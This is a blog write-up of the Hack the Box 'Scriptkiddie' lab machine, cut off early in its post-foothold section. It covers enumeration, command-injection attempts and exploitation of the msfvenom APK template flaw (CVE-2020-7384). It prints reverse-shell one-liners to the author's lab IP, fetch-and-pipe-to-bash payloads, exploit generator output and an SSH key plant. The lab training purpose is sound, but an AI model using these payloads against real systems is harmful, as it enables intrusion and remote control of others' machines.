---
layout: post
layout: default
title: "Scriptkiddie"
description: "My writeup for the HacktheBox Scriptkiddie machine. A fairly easy but extremely fun and flavourful Linux machine involving breaking a kid hacker's site."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---

# Hack the Box - Scriptkiddie

# Contents
- [Overview](#overview)
  - [Ratings](#ratings)
  - [Tags](#tags)
- [Enumeration](#enumeration)
  - [Autorecon](#autorecon)
  - [Nmap](#nmap)
  - [Gobuster](#gobuster)
- [Website](#website)
  - [Nmap](#nmap-1)
  - [Payloads](#payloads)
    - [Trying to Upload a Reverse Shell Template](#trying-to-upload-a-reverse-shell-template)
    - [Trying Command Injection](#trying-command-injection)
  - [sploits](#sploits)
  - [CVEs in Binaries](#cves-in-binaries)
- [Metasploit CVE](#metasploit-cve)
  - [Trying the Exploit Manually](#trying-the-exploit-manually)
    - [Debugging](#debugging)
  - [With msfconsole](#with-msfconsole)
- [Shell as kid](#shell-as-kid)
  - [Basic Enumeration](#basic-enumeration)
  - [Scanlosers.sh Command Injection](#scanloserssh-command-injection)
    - [Working Payload with APK](#working-payload-with-apk)
- [Shell as pwn -> Root](#shell-as-pwn---root)
  - [Notes on Alternative Methods](#notes-on-alternative-methods)

# Overview

**Box Details**

|IP|OS|User-Rated Difficulty|Date Started|Date User Completed|Date System Completed|
|---|---|---|---|---|
|10.10.10.226|Linux|4.0|2021-02-13|2021-02-15|2021-02-16|

This was a pretty easy but really fun box based on exploiting another hacker's badly made website. The website runs a number of Linux commands in the background, one of which makes use of an outdated metasploit library. This can be used to execute commands on the box as the `kid` user by uploading a malicious APK file. From the kid user, we can escalate to the `pwn` user by exploiting a command injection vulnerability in a logging script designed to 'hack back' other hackers. Finally, root involves exploiting `sudo` permissions on the `msfconsole` binary to gain a shell.

---

I loved this box, and how meta it was. Every part of the path felt super on-theme and it was really enjoyable. It was one of those boxes where everything running on the box felt like it had a reason to be there, and wasn't just plopped onto it for the sake of having a CTF.

As with other writeups, this may contain screenshots dated from after the box retired. That's because I didn't use Obsidian when i did this box originally, and I went back and recaptured screenshots for this writeup.

I came back to this box to do the writeup after watching a couple of other videos and writeups on it, and found some nice alternative ways to do what I did originally. Revisiting the box really helped me analyse and be critical of my methodology the first time round, and I actually managed to pop a shell today using a certain method when I couldn't a few months ago.

## Ratings

I rated user a 3 for difficulty, and root a 4. The exploits weren't super complicated, just a little fiddly, especially when trying to return a shell. The initial APK exploit was really cool, and something I'd never heard of before. Enumeration was all pretty simple, and the final step to root was also easy. The meat of the box was the initial foothold and the escalation to `pwn`, so I'm sort of happy with the final step being simple.

## Tags

#writeup #web #cve #command-injection #linux

# Enumeration

## Autorecon

I ran autorecon against the box first:

```bash
autorecon 10.10.10.226
[*] Scanning target 10.10.10.226
[*] Running service detection nmap-top-20-udp on 10.10.10.226
[*] Running service detection nmap-full-tcp on 10.10.10.226
[*] Running service detection nmap-quick on 10.10.10.226
[*] Service detection nmap-quick on 10.10.10.226 finished successfully in 29 seconds
[*] Found ssh on tcp/22 on target 10.10.10.226
[*] Found http on tcp/5000 on target 10.10.10.226
[*] Running task tcp/22/sslscan on 10.10.10.226
[*] Running task tcp/22/nmap-ssh on 10.10.10.226
[*] Running task tcp/5000/sslscan on 10.10.10.226
[*] Running task tcp/5000/nmap-http on 10.10.10.226
[*] Running task tcp/5000/curl-index on 10.10.10.226
[*] Running task tcp/5000/curl-robots on 10.10.10.226
[*] Running task tcp/5000/wkhtmltoimage on 10.10.10.226
[*] Running task tcp/5000/whatweb on 10.10.10.226
[*] Task tcp/22/sslscan on 10.10.10.226 finished successfully in less than a second
[*] Task tcp/5000/sslscan on 10.10.10.226 finished successfully in less than a second
[*] Running task tcp/5000/nikto on 10.10.10.226
[*] Running task tcp/5000/gobuster on 10.10.10.226
[*] Task tcp/5000/curl-robots on 10.10.10.226 finished successfully in less than a second
[*] Task tcp/5000/curl-index on 10.10.10.226 finished successfully in less than a second
[*] Task tcp/22/nmap-ssh on 10.10.10.226 finished successfully in 7 seconds
[*] Task tcp/5000/wkhtmltoimage on 10.10.10.226 finished successfully in 11 seconds
[*] Task tcp/5000/whatweb on 10.10.10.226 finished successfully in 16 seconds
[*] [10:53:56] - There are 5 tasks still running on 10.10.10.226
[*] Service detection nmap-top-20-udp on 10.10.10.226 finished successfully in 1 minute, 43 seconds
[*] [10:54:56] - There are 4 tasks still running on 10.10.10.226
[*] [10:55:56] - There are 4 tasks still running on 10.10.10.226
[*] [10:56:56] - There are 4 tasks still running on 10.10.10.226
[*] [10:57:56] - There are 4 tasks still running on 10.10.10.226
[*] [10:58:56] - There are 4 tasks still running on 10.10.10.226
[*] [10:59:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:00:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:01:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:02:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:03:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:04:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:05:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:06:56] - There are 4 tasks still running on 10.10.10.226
[*] [11:07:56] - There are 4 tasks still running on 10.10.10.226
[*] Task tcp/5000/nmap-http on 10.10.10.226 finished successfully in 14 minutes, 57 seconds
[*] [11:08:56] - There are 3 tasks still running on 10.10.10.226
[*] Task tcp/5000/nikto on 10.10.10.226 finished successfully in 16 minutes, 7 seconds
[*] [11:09:56] - There are 2 tasks still running on 10.10.10.226
[*] [11:10:56] - There are 2 tasks still running on 10.10.10.226
[*] [11:11:56] - There are 2 tasks still running on 10.10.10.226
[*] [11:12:56] - There are 2 tasks still running on 10.10.10.226
[*] Task tcp/5000/gobuster on 10.10.10.226 finished successfully in 19 minutes, 45 seconds
[*] [11:13:56] - There is 1 task still running on 10.10.10.226
...[snip]...
[*] [11:46:58] - There is 1 task still running on 10.10.10.226
```

I eventually cancelled the scan. I'm not sure what the task was (autorecon isn't great at telling you what exactly is running when something goes wrong) but it didn't turn out to matter.

## Nmap

The output of Autorecon's \_quick_tcp_nmap scan:

```bash
# Nmap 7.91 scan initiated Sat Feb 13 10:52:56 2021 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/Documents/scriptkiddie/results/10.10.10.226/scans/_quick_tcp_nmap.txt -oX /root/Documents/scriptkiddie/results/10.10.10.226/scans/xml/_quick_tcp_nmap.xml 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up, received user-set (0.060s latency).
Scanned at 2021-02-13 10:52:59 GMT for 26s
Not shown: 998 closed ports
Reason: 998 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/YB1g/YHwZNvTzj8lysM+SzX6dZzRbfF24y3ywkhai4pViGEwUklIPkEvuLSGH97NJ4y8r9uUXzyoq3iuVJ/vGXiFlPCrg+QDp7UnwANBmDqbVLucKdor+JkWHJJ1h3ftpEHgol54tj+6J7ftmaOR29Iwg+FKtcyNG6PY434cfA0Pwshw6kKgFa+HWljNl+41H3WVua4QItPmrh+CrSoaA5kCe0FAP3c2uHcv2JyDjgCQxmN1GoLtlAsEznHlHI1wycNZGcHDnqxEmovPTN4qisOKEbYfy2mu1Eqq3Phv8UfybV8c60wUqGtClj3YOO1apDZKEe8eZZqy5eXU8mIO+uXcp5zxJ/Wrgng7WTguXGzQJiBHSFq52fHFvIYSuJOYEusLWkGhiyvITYLWZgnNL+qAVxZtP80ZTq+lm4cJHJZKl0OYsmqO0LjlMOMTPFyA+W2IOgAmnM+miSmSZ6n6pnSA+LE2Pj01egIhHw5+duAYxUHYOnKLVak1WWk/C68=
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJA31QhiIbYQMUwn/n3+qcrLiiJpYIia8HdgtwkI8JkCDm2n+j6dB3u5I17IOPXE7n5iPiW9tPF3Nb0aXmVJmlo=
|   256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWjCdxetuUPIPnEGrowvR7qRAR7nuhUbfFraZFmbIr4
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 13 10:53:25 2021 -- 1 IP address (1 host up) scanned in 28.98 seconds
```

Key findings:
- SSH on port 22
- Server running Ubuntu according to OpenSSL string
- Werkzeug webserver runing on port 5000. Running searchsploit against the version number didn't bring up anything that looked interesting

## Gobuster

I ran a quick gobuster against the domain:

```bash
┌──(mac㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.226:5000 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.226:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/12 12:46:02 Starting gobuster in directory enumeration mode
===============================================================
                                
===============================================================
2021/06/12 12:50:37 Finished
===============================================================
```

It didn't find anything.

# Website

Visiting `http://10.10.10.226:5000` we see a site full of 'hacker tools':

![](/assets/images/blogs/Pasted image 20210612124335.png)

It looks like under the hood this will be running some common linux penetration testing commands. Let's try a few.

## Nmap

Let's try nmapping the box itself to test this, submitting `127.0.0.1`:

![](/assets/images/blogs/Pasted image 20210612124713.png)

Cool! That seems to work, and might be relevant if there's some sort of SSRF vulnerability later. What if there's some form of command injection?

I tried a few payloads here:
- `127.0.0.1 && id`
- `127.0.0.1; id`
- `127.0.0.1 -oA local` (to see if it was blocking traditional command injection syntax but would accept other commands)

They all gave me the same response, "invalid ip":

![](/assets/images/blogs/Pasted image 20210612124906.png)

No problem - let's move on to the next command.

## Payloads

This is a 'payload generator', which makes me think it might be running something like `msfvenom`.

### Trying to Upload a Reverse Shell Template

There is an option to choose an Operating System, and an option to upload a template file. Perhaps we can upload a reverse shell to the box via the template upload?

Curling the site with verbose mode doesn't tell us anything new about what it's running:

```bash
┌──(mac㉿kali)-[~]
└─$ curl -v 10.10.10.226:5000
*   Trying 10.10.10.226:5000...
* Connected to 10.10.10.226 (10.10.10.226) port 5000 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.226:5000
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 2135
< Server: Werkzeug/0.16.1 Python/3.8.5
< Date: Sat, 12 Jun 2021 12:00:52 GMT
```

I'm not sure what format to use for a payload on a Werkzeug server - from experience with flask, I'm pretty sure it won't just execute a file if we visit its path. We also didn't discover any sort of `/uploads` path in our [Gobuster](#gobuster) scan, but let's just generate a generic payload and see what happens:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie]
└─$ msfvenom -p linux/x64/shell_reverse_tcp -o test_shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Saved as: test_shell
```

We don't particularly care about the settings for the payload the *site* is generating - we just want it to save our malicious template:

![](/assets/images/blogs/Pasted image 20210612125842.png)

However, this doesn't work:

![](/assets/images/blogs/Pasted image 20210612125902.png)

Windows requires an exe. So if we select linux as our OS instead, will it take our file? This time it requires an ELF:

![](/assets/images/blogs/Pasted image 20210612130005.png)

The first time I did this box, I searched for an ELF file and grabbed its magic bytes, then sent that to a test file just to see if it would upload:

```bash
$ head -c 8 ~/Documents/enum/pspy64 > elfy
$ file elfy
elfy: ELF 64-bit LSB (SYSV)
$ echo "hello" >> elfy
$ file elfy
elfy: ELF 64-bit LSB (SYSV)
```

However, you can also generate an ELF with msfvenom, which is what I tried the second time round:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie]
└─$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o test_elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: test_elf
```

I sent this off:

![](/assets/images/blogs/Pasted image 20210612130520.png)

But got back the same error message. So I tried again with the `.elf` file extension:

![](/assets/images/blogs/Pasted image 20210612130731.png)

This time the server hung for a while, and eventually output "something went wrong":

![](/assets/images/blogs/Pasted image 20210612130829.png)

This suggests it is indeed running something like `msfvenom` in the background, as it always takes a while to execute.

I thought about looking for the file on the system - there was no `/uploads/` directory according to gobuster, but what if it's saved under `/payloads/`? Or just `/test_elf.elf`?

Both of these returned a 404:

![](/assets/images/blogs/Pasted image 20210612131021.png)

Let's try to generate a working payload and see if it tells us a file location. We'll turn on Burp Suite first, then I'll try a basic Android payload without a template file to see if it gives us anything. Here's the request in Burp:

![](/assets/images/blogs/Pasted image 20210612131404.png)

There's potentially a few parameters to fuzz in that request. But for now, let's see what happened. It worked!

![](/assets/images/blogs/Pasted image 20210612131340.png)

The page outputs a link to `/static/payloads/[HASH]` for downloading the payload:

![](/assets/images/blogs/Pasted image 20210612131505.png)

I tried looking for our malicious templates in this directory, and in `/static/templates/`, but neither worked:

![](/assets/images/blogs/Pasted image 20210612131620.png)

Let's check what format the Android generator needs for a template file, just for due diligence:

![](/assets/images/blogs/Pasted image 20210612131745.png)

It wants a `.apk` file. This will be useful to know later on.

### Trying Command Injection

Before I moved on to the next command, I checked for command injection in the payloads field:

![](/assets/images/blogs/Pasted image 20210612132004.png)

I got "invalid lhost ip":

![](/assets/images/blogs/Pasted image 20210612132028.png)

This was the same for several other command injection payloads.

## sploits

The final tool seems to just run `searchsploit`:

![](/assets/images/blogs/Pasted image 20210612132124.png)

We can try some basic command injections again. I submitted `ubuntu; id` in the field, and got this message back:

![](/assets/images/blogs/Pasted image 20210612132213.png)

Interesting! There seems to be some sort of command injection protection. I tried a few different payloads:
- `ubuntu & id`
- `ubuntu && id`
- `ubuntu | base64`
- `'` (trying this was unlikely to cause a command injection, but it also gave the same message, suggesting any non-alphanumeric character was banned)

I also tried `ubuntu; curl http://10.10.16.211/test` to see if I got a hit on a `sudo nc -lnvp 80` listener despite the warning. This one actually worked!

![](/assets/images/blogs/Pasted image 20210612132748.png)

I tried a python server:

![](/assets/images/blogs/Pasted image 20210612132814.png)

So can we get a shell? I submitted `ubuntu; nc 10.10.16.211 80 -e /bin/bash`. I got a connection - but it didn't stay open:

![](/assets/images/blogs/Pasted image 20210612133521.png)

Next I tried `ubuntu; bash -c 'bash -i >& /dev/tcp/10.10.16.211/80 0>&1'`, but I got the same result.

I spent a bit of time working on this, before moving on.

## CVEs in Binaries

At this point I wasn't sure where to go next, so wondered if there was a vulnerability in the binaries running on the box themselves. Here's what I thought the commands might look like:

```bash
# nmap
nmap --top-ports 100 [ip]

# payloads
msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=[lhost] LPORT=443 --template [template] -o /static/payloads/...

# sploits
searchsploit [term]
```

I wondered if there was a CVE for any of these binaries, so I checked in searchsploit:

![](/assets/images/blogs/Pasted image 20210612134305.png)

The final result looked promising! It was an vulnerability in metasploit itself:

```
Metasploit Framework 6.0.11 - msfvenom APK template command injection
```

And had a corresponding python script. Let's give it a try!

# Metasploit CVE

The CVE exploits a vulnerability in Metasploit 6.0.11. There's no indication of what's running on the box, but this seems to be our best shot.

I found a few articles on the topic that were helpful:
- https://nvd.nist.gov/vuln/detail/CVE-2020-7384
- https://github.com/nomi-sec/PoC-in-GitHub
- https://github.com/nikhil1232/CVE-2020-7384

It seems the exploit is in the Android payload generation, and we need to generate a malicious APK. This article gives a good overview of how it actually works:

https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md#the-vulnerability

It appears to be due to a bad character escape when using `keytool` to generate a self-signed certificate, presumably for allowing the result of the msfvenom command to run as a valid APK. The page describes it better than I can:

![](/assets/images/blogs/Pasted image 20210612135954.png)

## Trying the Exploit Manually

I copied across the exploit with `searchsploit -m multiple/local/49491.py` and renamed it to `gen-apk.py`.

I tried a good number of exploits here. The first thing I had to do was install `jarsigner` so the APK template could be generated:

```bash
$ sudo apt install -y default-jdk
```

The default payload just echoes some text:

```python
# Change me
payload = 'echo "Code execution as $(id)" > /tmp/win'
```

So we can change this to do something more interesting. I first tried a simple `/bin/bash` reverse shell:

```python
payload = 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1'
```

However, trying to generate this immediately crashed, giving me a "keytool error" which seemed to be [because of illegal characters](https://stackoverflow.com/questions/11808391/keytool-error-java-io-ioexceptionincorrect-ava-format).

Instead, I tried a base64 encoded payload:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "bash -c ‘bash -i >& /dev/tcp/10.10.16.211/9001 0>&1’" | base64
YmFzaCAtYyDigJhiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIxMS85MDAxIDA+JjHigJkK
```

So the payload should look like this:

```python
payload = 'echo "YmFzaCAtYyDigJhiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIxMS85MDAxIDA+JjHigJkK" | base64 -d | bash'
```

We can test this works with something harmless:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "id" | base64
aWQK
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "aWQK" | base64 -d | bash
uid=1000(mac) gid=1000(mac) groups=1000(mac),27(sudo)
```

Awesome. Now let's try running it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ python3 gen-apk.py 
[+] Manufacturing evil apkfile
Payload: echo "YmFzaCAtYyDigJhiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIxMS85MDAxIDA+JjHigJkK" | base64 -d | bash
-dname: CN='|echo ZWNobyAiWW1GemFDQXRZeURpZ0poaVlYTm9JQzFwSUQ0bUlDOWtaWFl2ZEdOd0x6RXdMakV3TGpFMkxqSXhNUzg1TURBeElEQStKakhpZ0prSyIgfCBiYXNlNjQgLWQgfCBiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmphrdxir6g/evil.apk
Do: msfvenom -x /tmp/tmphrdxir6g/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

We can submit this template to the generator. Again, the choice of `lhost` doesn't matter:

![](/assets/images/blogs/Pasted image 20210612141104.png)

We click generate, and the page hangs for a while. Eventually, we receive this back to our shell:

![](/assets/images/blogs/Pasted image 20210612141148.png)

Strange, I've never seen that error before. But it means we're on the right track.

I tried to go for a staged payload instead. To achieve this, I'd need two APK files - one to save a reverse shell to the box, and one to execute it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "echo 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1' > /tmp/hellothere.sh" | base64
ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMTEvOTAwMSAwPiYxJyA+IC90bXAv
aGVsbG90aGVyZS5zaAo=
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "/tmp/hellothere.sh" | base64
L3RtcC9oZWxsb3RoZXJlLnNoCg==
```

I had a few issues with this, including base64 encoding occasionally inserting a line break depending on what IP I had. I had to keep checking my payload was okay with `base64 -d` before submitting:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMTEvOTAwMSAwPiYxJyA+IC90bXAvaGVsbG90aGVyZS5zaAo=" | base64 -d
echo 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1' > /tmp/hellothere.sh
```

I also created a second copy of the python script with the second payload, so I could run them both without having to keep going in and editing the `payload` variable.

Submitting the first stage eventually gave me the "something went wrong message":

![](/assets/images/blogs/Pasted image 20210612141910.png)

This isn't really indicative of whether or not it worked. To test, we need to run the second one as well. Resubmitting another payload:

![](/assets/images/blogs/Pasted image 20210612142007.png)

(and remembering to restart our netcat listener):

![](/assets/images/blogs/Pasted image 20210612142103.png)

The page finishes executing, but we don't get a hit. I tried again, this time specifying port 80 in my first stage, and starting a new listener:

![](/assets/images/blogs/Pasted image 20210612142418.png)

But no hit.

### Debugging

I tried a few methods here to try and fix my payload:
- `echo "nc -e /bin/bash 10.10.14.9 9001" | base64` as my payload as an alternative to the `/dev/tcp` shell
- using `/bin/sh` in all the payloads rather than `/bin/bash`
- using a `wget http://10.10.16.211/test` payload to download a reverse shell from my box. This got a hit, proving we did in fact have code execution - but I struggled to think where the downloaded file would end up

I tried a payload that would grab a file with `wget` (as we know this works) and pipe it directly to `bash`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "wget http://10.10.16.211/rev.sh | bash" | base64
d2dldCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ python3 gen-apk.py 
[+] Manufacturing evil apkfile
Payload: echo "d2dldCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK" | base64 -d | bash
-dname: CN='|echo ZWNobyAiZDJkbGRDQm9kSFJ3T2k4dk1UQXVNVEF1TVRZdU1qRXhMM0psZGk1emFDQjhJR0poYzJnSyIgfCBiYXNlNjQgLWQgfCBiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpv43nnb6f/evil.apk
Do: msfvenom -x /tmp/tmpv43nnb6f/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

I made a `rev.sh` file:

```bash
#rev.sh
bash -c 'bash -i >& /dev/tcp/10.10.16.211/9001 0>&1'
```

And stood up a python listener on port 80:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then a netcat listener to hopefully catch the shell:

```bash
┌──(mac㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
```

I got a hit on my Python server, but nothing in netcat:

![](/assets/images/blogs/Pasted image 20210612143319.png)

I tried one more time, using `curl` instead of `wget`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ echo "curl http://10.10.16.211/rev.sh | bash" | base64
Y3VybCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/scripts]
└─$ python3 gen-apk.py 
[+] Manufacturing evil apkfile
Payload: echo "Y3VybCBodHRwOi8vMTAuMTAuMTYuMjExL3Jldi5zaCB8IGJhc2gK" | base64 -d | bash
-dname: CN='|echo ZWNobyAiWTNWeWJDQm9kSFJ3T2k4dk1UQXVNVEF1TVRZdU1qRXhMM0psZGk1emFDQjhJR0poYzJnSyIgfCBiYXNlNjQgLWQgfCBiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmp056ul9j3/evil.apk
Do: msfvenom -x /tmp/tmp056ul9j3/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

This time it worked!

![](/assets/images/blogs/Pasted image 20210612143650.png)

### With msfconsole

The first time I did this box, I used msfconsole to generate the apk after not getting it to work manually. It worked first time, and I always wondered what the command was. I'm happy to have been able to successfully debug this the second time around!

Here's what I did with msfconsole either way:

```bash
msf6 > search msfvenom

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection

msf6 > info 0

       Name: Rapid7 Metasploit Framework msfvenom APK Template Command Injection
     Module: exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
   Platform: Unix
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2020-10-29

Provided by:
  Justin Steven

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  FILENAME  msf.apk          yes       The APK file name

Payload information:
  Avoid: 5 characters

Description:
  This module exploits a command injection vulnerability in Metasploit 
  Framework's msfvenom payload generator when using a crafted APK file 
  as an Android payload template. Affects Metasploit Framework <= 
  6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this 
  module is a relatively empty yet valid-enough APK file. To trigger 
  the vulnerability, the victim user should do the following: msfvenom 
  -p android/<...> -x <crafted_file.apk>

References:
  https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md
  https://cvedetails.com/cve/CVE-2020-7384/

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LPORT 9001
LPORT => 9001
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /root/.msf4/local/msf.apk
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exit
```

Then I used the outputted `msf.apk` file to get a shell.

# Shell as kid

I first tried upgrading my shell. The default terminal seemed to be `/bin/sh`:

![](/assets/images/blogs/Pasted image 20210612144401.png)

We can also grab the user flag:

![](/assets/images/blogs/Pasted image 20210612144448.png)

`kid` has an SSH directory, so we can write a key if we want to:

```bash

[on host]
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/ssh]
└─$ ssh-keygen -f scriptkiddie

[on kid]
echo 'ssh-rsa A..[rest of scriptkiddie.pub]..8= mac@kali' >> .ssh/authorized_keys

[on host]
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/ssh]
└─$ ssh -i scriptkiddie kid@10.10.10.226
```

## Basic Enumeration

I checked the home directory out:

```bash
$ ls -la
total 60
drwxr-xr-x 11 kid  kid  4096 Feb  3 11:49 .
